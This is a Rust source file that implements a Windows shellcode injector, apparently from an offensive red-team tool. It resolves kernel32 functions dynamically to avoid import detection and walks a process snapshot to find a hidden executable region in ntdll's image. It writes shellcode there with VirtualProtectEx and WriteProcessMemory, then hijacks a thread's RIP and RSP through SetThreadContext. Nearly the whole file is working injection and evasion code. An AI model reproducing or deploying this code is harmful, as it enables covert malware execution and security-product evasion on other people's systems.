#![allow(unused_assignments)]
#![allow(unused_variables)]
#![allow(dead_code)]
#![allow(unused_unsafe)]

use noldr::get_function_address;

// Standard library imports
use std::{ffi::c_void as std_c_void, mem::zeroed, ptr::null_mut};

// Third-party crates
use Snapshotting_rs::ProcessSnapshot;

// WinAPI imports
use winapi::{
    ctypes::c_void as winapi_c_void,
    shared::{
        basetsd::SIZE_T, minwindef::{DWORD, FALSE, FARPROC, HMODULE, LPVOID}, winerror::ERROR_SUCCESS
    },
    um::{
        memoryapi::{VirtualProtectEx, WriteProcessMemory}, processsnapshot::{PSS_CAPTURE_VA_CLONE, PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION}, winnt::{
            CONTEXT, CONTEXT_ALL, HANDLE, HEAP_ZERO_MEMORY, LPCSTR, MEMORY_BASIC_INFORMATION, MEM_IMAGE, PAGE_EXECUTE_READ, PAGE_READWRITE
        }
    },
};
use winapi::um::processsnapshot::PSS_CAPTURE_VA_SPACE;
use winapi::um::processsnapshot::PSS_CAPTURE_FLAGS as PSS_CAPTURE_FLAGS_winapi;

// Windows-rs imports
use windows::Win32::System::Diagnostics::ProcessSnapshotting::{
    PssWalkMarkerFree, PssWalkSnapshot, HPSS, HPSSWALK, PSS_ALLOCATOR,
    PSS_CAPTURE_FLAGS, PSS_CAPTURE_THREADS, PSS_CAPTURE_THREAD_CONTEXT, PSS_THREAD_ENTRY,
    PSS_VA_SPACE_ENTRY, PSS_WALK_INFORMATION_CLASS, PSS_WALK_THREADS, PSS_WALK_VA_SPACE,
};

pub fn get_helper(
    stack_offset: &mut usize,
    _base_address: *mut winapi_c_void,
    _shellcode_size: usize,
    stack: *mut winapi_c_void,
    size_of_image: usize,
) {
    *stack_offset = 0;
    let mut j: u32 = 0;

    while j < size_of_image as u32 {
        *stack_offset = *stack_offset + j as usize;
        let stack_val = unsafe { *((stack as *mut u8).add(j as usize) as *mut usize) };
        j = j + 1;
        if stack_val == 0 {
            *stack_offset = *stack_offset + j as usize;
            break;
        }
    }
}
//need to get rid of this. this repo doesn't use dynamic resolution. and instead of re-running the capture, I should be able to pass
//whats needed to get_hidden_injection_address
pub fn capture_process_snapshot(handle: HANDLE) -> Result<ProcessSnapshot, String> {
    //println!("Capturing process...");
    //let flags: PSS_CAPTURE_FLAGS = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION;

    match ProcessSnapshot::new(handle) {
        Ok(snap) => {
            //println!("Process snapshot completed successfully");
            //println!("Snapshot handle: {:?}", snap);
            //println!("Snapshot will be automatically freed when it goes out of scope");
            Ok(snap)
        }
        Err(e) => Err(format!("Error capturing process snapshot: {}", e)),
    }
}

pub fn get_hidden_injection_address(
    //process_handle: HANDLE,
    target_process: *mut winapi::ctypes::c_void,
    shellcode_size: usize,
    kernel32: *mut std_c_void,
) -> Result<*mut winapi_c_void, String> {
    //i dont like how this is done. we end up snappshotting the process twice.
    //but im going to finish this and then ill come back to refactor it all.

    //instead of using capture_process_snapshot, we'll dynamically load the snapshotting functions

    //let snapshot = capture_process_snapshot(process_handle)?;

    let snapshot_ctx: CONTEXT = unsafe { zeroed() };
    let mut snapshot_handle = HPSS::default();
    let walk_marker_handle = HPSSWALK::default();
    let thread_entry: PSS_THREAD_ENTRY = unsafe { zeroed() };
    let buffer = vec![0u8; std::mem::size_of::<PSS_THREAD_ENTRY>()];

    // Capture snapshot
    let capture_flags: PSS_CAPTURE_FLAGS_winapi = PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_VA_SPACE | PSS_CAPTURE_VA_SPACE_SECTION_INFORMATION;
    let win32_handle = windows::Win32::Foundation::HANDLE(target_process as _);

    //get the function address for PssCaptureSnapshot
    let pss_capture_snapshot_address = noldr::get_function_address(kernel32, "PssCaptureSnapshot");

    let pss_capture_snapshot = unsafe {
        let fn_ptr = match pss_capture_snapshot_address {
            Some(addr) => addr,
            None => return Err("Failed to get PssCaptureSnapshot address".to_string()),
        };

        std::mem::transmute::<_, extern "system" fn(HANDLE, PSS_CAPTURE_FLAGS_winapi, u32, *mut HPSS) -> u32>(
            fn_ptr,
        )
    };

    let pss_result = pss_capture_snapshot(
        target_process,
        capture_flags,
        CONTEXT_ALL,
        &mut snapshot_handle,
    );

    if pss_result != 0 {
        eprintln!("[!] PssCaptureSnapshot failed: Win32 error {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        return Err("Failed to capture snapshot".to_string());
    }
    //print snapshot handle

    //println!("Snapshot handle: {:?}", snapshot_handle.0);

    let mut shellcode_location: *mut winapi_c_void = null_mut();
    let mut walker = HPSSWALK::default();
    //get the function address for PssWalkMarkerCreate
    let pss_walk_marker_create_address =
        noldr::get_function_address(kernel32, "PssWalkMarkerCreate");

    //define the function signature
    type PssWalkMarkerCreateFn =
        unsafe extern "system" fn(*const PSS_ALLOCATOR, *mut HPSSWALK) -> u32;

    //call the function
    let pss_result = unsafe {
        std::mem::transmute::<_, PssWalkMarkerCreateFn>(match pss_walk_marker_create_address {
            Some(addr) => addr,
            None => return Err("Failed to get PssWalkMarkerCreate address".to_string()),
        })(std::ptr::null(), &mut walker)
    };

    if pss_result != 0 {
        eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        return Err("Failed to create walk marker".to_string());
    }

    //println!("Walk Marker Handle: 0x{:?}", walker);

    let mut buffer = vec![0u8; std::mem::size_of::<PSS_VA_SPACE_ENTRY>()];
    let mut va_space_entry: PSS_VA_SPACE_ENTRY = unsafe { std::mem::zeroed() };

    //println!("About to start walking snapshot...");
    /*println!(
        "Snapshot handle raw: {:#x}",
        snapshot.snapshot_handle as usize
    );*/
    //println!("Walker handle raw: {:#x}", walker.0 as usize);

    //locate the function address for PssWalkSnapshot
    let pss_walk_snapshot_address = noldr::get_function_address(kernel32, "PssWalkSnapshot");

    //define the function signature
    type PssWalkSnapshotFn = unsafe extern "system" fn(HPSS, PSS_WALK_INFORMATION_CLASS, HPSSWALK, *mut std_c_void, DWORD) -> u32;

    //call the function
    let mut pss_success = unsafe {
        let result = std::mem::transmute::<_, PssWalkSnapshotFn>(match pss_walk_snapshot_address {
            Some(addr) => addr,
            None => return Err("Failed to get PssWalkSnapshot address".to_string()),
        })(
            snapshot_handle,
            PSS_WALK_VA_SPACE,
            walker,
            buffer.as_mut_ptr() as *mut std_c_void,
            buffer.len() as DWORD
        );

        // Copy buffer regardless of result
        std::ptr::copy_nonoverlapping(
            buffer.as_ptr(),
            &mut va_space_entry as *mut _ as *mut u8,
            std::mem::size_of::<PSS_VA_SPACE_ENTRY>(),
        );
        result
    };

    let mut i = 0;
    while pss_success == ERROR_SUCCESS {
        //println!("\nExamining region {}:", i);
        i += 1;

        let mut mem_basic_info = unsafe { std::mem::zeroed::<MEMORY_BASIC_INFORMATION>() };
        mem_basic_info.BaseAddress = va_space_entry.BaseAddress as *mut winapi_c_void;
        mem_basic_info.AllocationBase = va_space_entry.AllocationBase as *mut winapi_c_void;
        mem_basic_info.AllocationProtect = va_space_entry.AllocationProtect;
        mem_basic_info.RegionSize = va_space_entry.RegionSize;
        mem_basic_info.State = va_space_entry.State;
        mem_basic_info.Protect = va_space_entry.Protect;
        mem_basic_info.Type = va_space_entry.Type;

        //println!("Region details:");
        //println!("  Base Address: {:p}", mem_basic_info.BaseAddress);
        //println!("  Protection: {:#x}", mem_basic_info.Protect);
        //println!("  Type: {:#x}", va_space_entry.Type);
        //println!("  Size: {}", va_space_entry.SizeOfImage);

        if mem_basic_info.Protect == 0x20 {
            //println!("Found region with correct protection");
            if va_space_entry.Type == MEM_IMAGE {
                //println!("Region is MEM_IMAGE");
                if va_space_entry.SizeOfImage > 1000000 {
                    //println!("[+] ntdll.dll captured");

                    let stack: *mut winapi_c_void = null_mut();
                    let mut stack_offset: usize = 0;

                    //locate the function address for ReadProcessMemory
                    let read_process_memory_address = noldr::get_function_address(kernel32, "ReadProcessMemory");

                    //define the function signature
                    type ReadProcessMemoryFn = unsafe extern "system" fn(HANDLE, *const winapi_c_void, *mut winapi_c_void, SIZE_T, *mut winapi_c_void) -> winapi::shared::minwindef::BOOL;

                    //call the function
                    let read_process_memory = unsafe {
                        std::mem::transmute::<_, ReadProcessMemoryFn>(match read_process_memory_address {
                            Some(addr) => addr,
                            None => return Err("Failed to get ReadProcessMemory address".to_string()),
                        })(target_process, va_space_entry.ImageBase as *const winapi_c_void, stack, shellcode_size, null_mut())
                    };

                    //locate the function address for GetProcessHeap
                    let get_process_heap_address = noldr::get_function_address(kernel32, "GetProcessHeap");

                    //check if the address is valid
                    if get_process_heap_address.is_none() {
                        return Err("Failed to get GetProcessHeap address".to_string());
                    }

                    //define the function signature with explicit calling convention
                    type GetProcessHeapFn = unsafe extern "system" fn() -> HANDLE;

                    //call the function with proper safety wrapper
                    let heap = unsafe {
                        let func = std::mem::transmute::<_, GetProcessHeapFn>(get_process_heap_address.unwrap());
                        (func)()  // Call the function directly rather than through another transmute
                    };

                    //locate the function address for HeapAlloc
                    let heap_alloc_address = noldr::get_function_address(kernel32, "HeapAlloc")
                    .map(|addr| unsafe { resolve_forwarded_export(kernel32, addr as *const ()) });

                    // Now try the dynamic version using the same pattern that worked
                    type HeapAllocFn = unsafe extern "system" fn(
                        hHeap: HANDLE,
                        dwFlags: DWORD,
                        dwBytes: SIZE_T
                    ) -> LPVOID;

                    let stack = unsafe {
                        let heap_alloc_fn: HeapAllocFn = std::mem::transmute(heap_alloc_address.unwrap());
                        
                        heap_alloc_fn(
                            heap,
                            HEAP_ZERO_MEMORY,
                            mem_basic_info.RegionSize as usize
                        )
                    };
                    //println!("Dynamic HeapAlloc result: {:p}", stack_dynamic);

                    if !stack.is_null() {
                        get_helper(
                            &mut stack_offset,
                            mem_basic_info.BaseAddress,
                            shellcode_size,
                            stack,
                            va_space_entry.SizeOfImage as usize,
                        );

                        //println!("Stack offset calculated: {:#x}", stack_offset);

                        shellcode_location = ((stack_offset + mem_basic_info.BaseAddress as usize)
                            - shellcode_size * 3)
                            as *mut winapi_c_void;
                        //println!("Shellcode location: {:p}", shellcode_location);

                        //locate the function address for HeapFree
                        let heap_free_address = noldr::get_function_address(kernel32, "HeapFree");

                        //define the function signature
                        type HeapFreeFn = unsafe extern "system" fn(HANDLE, DWORD, LPVOID) -> winapi::shared::minwindef::BOOL;

                        //call the function
                        let heap_free = unsafe {
                            std::mem::transmute::<_, HeapFreeFn>(heap_free_address.unwrap())
                        };

                        //check if the function call was successful
                        if unsafe { heap_free(heap, 0, stack) } == FALSE {
                            eprintln!("[!] HeapFree failed: Win32 error {}", unsafe {
                                winapi::um::errhandlingapi::GetLastError()
                            });
                            return Err("Failed to free heap".to_string());
                        }

                        //YOU ARE HERE

                        //locate the function address for PssWalkMarkerFree
                        let pss_walk_marker_free_address = noldr::get_function_address(kernel32, "PssWalkMarkerFree");

                        //define the function signature
                        type PssWalkMarkerFreeFn = unsafe extern "system" fn(HPSSWALK) -> winapi::shared::minwindef::BOOL;

                        //call the function
                        let pss_walk_marker_free = unsafe {
                            std::mem::transmute::<_, PssWalkMarkerFreeFn>(pss_walk_marker_free_address.unwrap())
                        };

                        //unsafe { PssWalkMarkerFree(walker) };
                        //println!("[+] Original base address: {:p}", mem_basic_info.BaseAddress);
                        //println!("[+] Stack offset: {:#x}", stack_offset);
                        //println!("[+] Final shellcode location: {:p}", shellcode_location);
                        return Ok(shellcode_location);
                    }
                } else {
                    //println!("Region size too small: {}", va_space_entry.SizeOfImage);
                }
            } else {
                //println!("Not MEM_IMAGE type: {:#x}", va_space_entry.Type);
            }
        }

        pss_success = unsafe {
            let result = PssWalkSnapshot(
                snapshot_handle,
                PSS_WALK_VA_SPACE,
                walker,
                Some(&mut buffer),
            );
            //println!("PssWalkSnapshot result: {}", result);

            // Copy buffer regardless of result
            std::ptr::copy_nonoverlapping(
                buffer.as_ptr(),
                &mut va_space_entry as *mut _ as *mut u8,
                std::mem::size_of::<PSS_VA_SPACE_ENTRY>(),
            );
            result
        };
    }

    //println!("Finished walking snapshot. Examined {} regions", i);
    unsafe { PssWalkMarkerFree(walker) };
    Err("No suitable injection location found".to_string())
}

//replace with NTAPI calls instead of VirtualProtectEx and WriteProcessMemory
//use NtWriteVirtualMemory and NtProtectVirtualMemory or something equivalent
pub fn inject_and_rwx(
    process_handle: HANDLE,
    shellcode_location: *mut winapi_c_void,
    shellcode: &[u8],
) -> bool {
    let mut old_protect: DWORD = 0;
    let size = shellcode.len();
    let mut bytes_written: usize = 0;

    // First VirtualProtectEx call to set PAGE_READWRITE
    let success = unsafe {
        VirtualProtectEx(
            process_handle,
            shellcode_location,
            size,
            PAGE_READWRITE,
            &mut old_protect,
        )
    };

    if success == 0 {
        eprintln!("[!] [1] VirtualProtectEx FAILED with Error: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        return false;
    }

    // WriteProcessMemory to inject shellcode
    let success = unsafe {
        WriteProcessMemory(
            process_handle,
            shellcode_location,
            shellcode.as_ptr() as *const winapi_c_void,
            size,
            &mut bytes_written,
        )
    };

    if success == 0 {
        eprintln!("[!] WriteProcessMemory FAILED with Error: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        return false;
    }

    // Second VirtualProtectEx call to set PAGE_EXECUTE_READ
    let success = unsafe {
        VirtualProtectEx(
            process_handle,
            shellcode_location,
            size,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };

    if success == 0 {
        eprintln!("[!] [2] VirtualProtectEx FAILED with Error: {}", unsafe {
            winapi::um::errhandlingapi::GetLastError()
        });
        return false;
    }

    true
}

pub fn snap_thread_hijack(
    pid: DWORD,
    thread_handle: HANDLE,
    thread_id: DWORD,
    target_process: *mut winapi::ctypes::c_void,
    rip: Option<*mut winapi_c_void>,
    rsp: Option<*mut winapi_c_void>,
    kernel32: *mut std_c_void,
) -> bool {
    unsafe {
        let mut snapshot_ctx: CONTEXT = zeroed();
        let mut snapshot_handle = HPSS::default();
        let mut walk_marker_handle = HPSSWALK::default();
        let mut thread_entry: PSS_THREAD_ENTRY = zeroed();
        let mut buffer = vec![0u8; std::mem::size_of::<PSS_THREAD_ENTRY>()];

        // Capture snapshot
        let capture_flags = PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT;
        let win32_handle = windows::Win32::Foundation::HANDLE(target_process as _);

        //get the function address for PssCaptureSnapshot
        let pss_capture_snapshot_address =
            noldr::get_function_address(kernel32, "PssCaptureSnapshot");

        let pss_capture_snapshot = unsafe {
            let fn_ptr = match pss_capture_snapshot_address {
                Some(addr) => addr,
                None => return false,
            };

            std::mem::transmute::<
                _,
                extern "system" fn(HANDLE, PSS_CAPTURE_FLAGS, u32, *mut HPSS) -> u32,
            >(fn_ptr)
        };

        let pss_result = pss_capture_snapshot(
            target_process,
            PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT,
            0x0010_0017,
            &mut snapshot_handle,
        );

        if pss_result != 0 {
            eprintln!(
                "[!] PssCaptureSnapshot failed: Win32 error {}",
                winapi::um::errhandlingapi::GetLastError()
            );
            return false;
        }
        //println!("[+] Snapshot captured successfully");

        //get the function address for PssWalkMarkerCreate
        let pss_walk_marker_create_address =
            noldr::get_function_address(kernel32, "PssWalkMarkerCreate");

        //define the function signature
        type PssWalkMarkerCreateFn =
            unsafe extern "system" fn(*const PSS_ALLOCATOR, *mut HPSSWALK) -> u32;

        //call the function
        let pss_result = unsafe {
            std::mem::transmute::<_, PssWalkMarkerCreateFn>(match pss_walk_marker_create_address {
                Some(addr) => addr,
                None => return false,
            })(std::ptr::null(), &mut walk_marker_handle)
        };

        if pss_result != 0 {
            eprintln!("[!] PssWalkMarkerCreate failed: Win32 error {}", unsafe {
                winapi::um::errhandlingapi::GetLastError()
            });
            return false;
        }

        //get the function address for PssWalkSnapshot
        let pss_walk_snapshot_address = noldr::get_function_address(kernel32, "PssWalkSnapshot");

        //define the function signature
        type PssWalkSnapshotFn = unsafe extern "system" fn(
            HPSS,
            PSS_WALK_INFORMATION_CLASS,
            HPSSWALK,
            *mut std_c_void,
            DWORD, // Added BufferLength parameter
        ) -> u32;

        //call the function
        let pss_result = unsafe {
            std::mem::transmute::<_, PssWalkSnapshotFn>(match pss_walk_snapshot_address {
                Some(addr) => addr,
                None => return false,
            })(
                snapshot_handle,
                PSS_WALK_THREADS,
                walk_marker_handle,
                buffer.as_mut_ptr() as *mut std_c_void,
                buffer.len() as DWORD,
            )
        };

        while pss_result == 0 {
            // Copy buffer to thread_entry
            std::ptr::copy_nonoverlapping(
                buffer.as_ptr(),
                &mut thread_entry as *mut _ as *mut u8,
                std::mem::size_of::<PSS_THREAD_ENTRY>(),
            );

            if thread_entry.ThreadId == thread_id {
                // Copy context record
                if !thread_entry.ContextRecord.is_null() {
                    std::ptr::copy_nonoverlapping(
                        thread_entry.ContextRecord as *const winapi::um::winnt::CONTEXT,
                        &mut snapshot_ctx,
                        1,
                    );

                    //println!("[+] Original thread entry context record: {:p}", thread_entry.ContextRecord);
                    //println!("[+] Thread ID we're targeting: {}", thread_id);
                    //println!("[+] Process creation flags included DEBUG_PROCESS: {}",
                    //    NORMAL_PRIORITY_CLASS | DETACHED_PROCESS | DEBUG_PROCESS);

                    //println!("[+] Snapctx.Rip Before Setting: 0x{:x}", snapshot_ctx.Rip);

                    if let Some(rip_ptr) = rip {
                        // Create a u64 with the address value instead of dereferencing
                        snapshot_ctx.Rip = rip_ptr as u64;
                        //println!("[+] Setting RIP directly to address: 0x{:x}", snapshot_ctx.Rip);
                        //println!("[+] Shellcode location (raw pointer): {:p}", rip_ptr);
                    }
                    if let Some(rsp_ptr) = rsp {
                        snapshot_ctx.Rsp = rsp_ptr as u64;
                    }

                    //println!("[+] Snapctx.Rip After Setting: 0x{:x}", snapshot_ctx.Rip);

                    //println!("[+] Setting thread context...");

                    //locate the function address for SetThreadContext
                    let set_thread_context_address =
                        noldr::get_function_address(kernel32, "SetThreadContext");

                    //define the function signature
                    type SetThreadContextFn =
                        unsafe extern "system" fn(
                            HANDLE,
                            *const CONTEXT,
                        )
                            -> winapi::shared::minwindef::BOOL;

                    //define the function
                    let set_thread_context = unsafe {
                        std::mem::transmute::<_, SetThreadContextFn>(
                            match set_thread_context_address {
                                Some(addr) => addr,
                                None => return false,
                            },
                        )
                    };

                    //call the function
                    if set_thread_context(thread_handle, &snapshot_ctx) == FALSE {
                        eprintln!(
                            "[!] SetThreadContext FAILED with Error: {}",
                            winapi::um::errhandlingapi::GetLastError()
                        );
                        return false;
                    }

                    std::thread::sleep(std::time::Duration::from_secs(5));

                    //locate the function address for DebugActiveProcessStop
                    let debug_active_process_stop_address =
                        noldr::get_function_address(kernel32, "DebugActiveProcessStop");

                    //define the function signature
                    type DebugActiveProcessStopFn =
                        unsafe extern "system" fn(DWORD) -> winapi::shared::minwindef::BOOL;

                    //call the function
                    let debug_active_process_stop = unsafe {
                        std::mem::transmute::<_, DebugActiveProcessStopFn>(
                            match debug_active_process_stop_address {
                                Some(addr) => addr,
                                None => return false,
                            },
                        )
                    };

                    //call the function
                    if debug_active_process_stop(pid) == FALSE {
                        eprintln!(
                            "[!] DebugActiveProcessStop FAILED with Error: {}",
                            winapi::um::errhandlingapi::GetLastError()
                        );
                        return false;
                    }

                    //println!("[+] DebugActiveProcessStop...");

                    //println!("[+] DONE");
                    break;
                }
            }

            let pss_result = unsafe {
                std::mem::transmute::<_, PssWalkSnapshotFn>(match pss_walk_snapshot_address {
                    Some(addr) => addr,
                    None => return false,
                })(
                    snapshot_handle,
                    PSS_WALK_THREADS,
                    walk_marker_handle,
                    buffer.as_mut_ptr() as *mut std_c_void,
                    buffer.len() as DWORD,
                )
            };
        }

        //locate the function address for PssWalkMarkerFree
        let pss_walk_marker_free_address =
            noldr::get_function_address(kernel32, "PssWalkMarkerFree");

        //define the function signature
        type PssWalkMarkerFreeFn = unsafe extern "system" fn(HPSSWALK) -> u32;

        //call the function
        let pss_result = unsafe {
            std::mem::transmute::<_, PssWalkMarkerFreeFn>(match pss_walk_marker_free_address {
                Some(addr) => addr,
                None => return false,
            })(walk_marker_handle)
        };
        if pss_result != 0 {
            eprintln!(
                "[!] PssWalkMarkerFree failed: Win32 error {}",
                winapi::um::errhandlingapi::GetLastError()
            );
            return false;
        }

        true
    }
}

// Helper function to check if address is a forwarder
unsafe fn resolve_forwarded_export(kernel32: *mut std_c_void, address: *const ()) -> *const () {
    
    let dos_header = kernel32 as *const winapi::um::winnt::IMAGE_DOS_HEADER;
    let nt_headers = (kernel32 as usize + (*dos_header).e_lfanew as usize) 
        as *const winapi::um::winnt::IMAGE_NT_HEADERS;
    let export_dir = &(*nt_headers).OptionalHeader.DataDirectory[0];
    
    // Check if address is within export directory
    let export_start = kernel32 as usize + export_dir.VirtualAddress as usize;
    let export_end = export_start + export_dir.Size as usize;
    
    if (address as usize) >= export_start && (address as usize) <= export_end {
        //locate GetProcAddress
        let get_proc_address = get_function_address(kernel32, "GetProcAddress");

        //call GetProcAddress
        let get_proc_address_fn = unsafe {
            std::mem::transmute::<_, GetProcAddressFn>(get_proc_address.unwrap())
        };

        //define the function signature
        type GetProcAddressFn = unsafe extern "system" fn(HMODULE, LPCSTR) -> FARPROC;

        let heap_alloc_str = std::ffi::CString::new("HeapAlloc").unwrap();

        //call the function
        //let get_proc_address_result = get_proc_address_fn(kernel32 as _, heap_alloc_str.as_ptr());

        // It's a forwarder - use GetProcAddress to get real address
        //use winapi::um::libloaderapi::GetProcAddress;
        
        //GetProcAddress(kernel32 as _, heap_alloc_str.as_ptr()) as *const ()
        let get_proc_address_result = get_proc_address_fn(kernel32 as _, heap_alloc_str.as_ptr()) as *const ();
        get_proc_address_result
    } else {
        address
    }
}
